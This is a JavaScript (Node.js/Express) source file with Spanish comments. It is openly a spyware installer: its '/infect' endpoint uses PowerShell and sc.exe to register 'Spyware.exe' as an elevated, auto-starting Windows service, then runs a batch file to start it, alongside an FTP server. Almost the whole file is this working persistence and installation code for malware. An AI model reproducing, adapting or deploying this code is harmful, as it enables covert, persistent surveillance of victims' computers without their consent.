import { exec } from 'child_process';
import { ftp } from '../ftp/fptSrv.js';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());
const PORT = 3000;

app.get('/infect', (req, res) => {
    const spywareExePath = path.join(__dirname, '../Spyware.exe');
    const installServPath = path.join(__dirname, '../commands/installServ.bat');
    const startServPath = path.join(__dirname, '../commands/exec_startServ.bat');
    console.log('Infecting...');
    console.log('Spyware path:', spywareExePath);
    const installServCmd = `powershell -Command "Start-Process sc.exe -ArgumentList 'create Spyware binPath= \\"${spywareExePath}\\" start= auto' -Verb runAs"`;

    // Ejecutar el script de instalación del servicio
    exec(installServCmd, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error ejecutando installServ.bat: ${error.message}`);
            return res.status(500).send(`Error ejecutando el comando: ${error.message}`);
        }
        if (stderr) {
            console.error(`Stderr en installServ.bat: ${stderr}`);
        }
        console.log(`Resultado installServ.bat: ${stdout}`);

        // Esperar 2 segundos antes de iniciar el servicio
        setTimeout(() => {
            exec(`"${startServPath}"`, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error ejecutando startServ.bat: ${error.message}`);
                    return res.status(500).send(`Error ejecutando el comando: ${error.message}`);
                }
                if (stderr) {
                    console.error(`Stderr en startServ.bat: ${stderr}`);
                }
                console.log(`Resultado startServ.bat: ${stdout}`);
                res.send('Servidor FTP infectado');
            });
        }, 2000);
    });
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    ftp.start().then(() => {
        console.log('FTP server started successfully');
    }).catch((error) => {
        console.error('Failed to start FTP server:', error);
    });
});
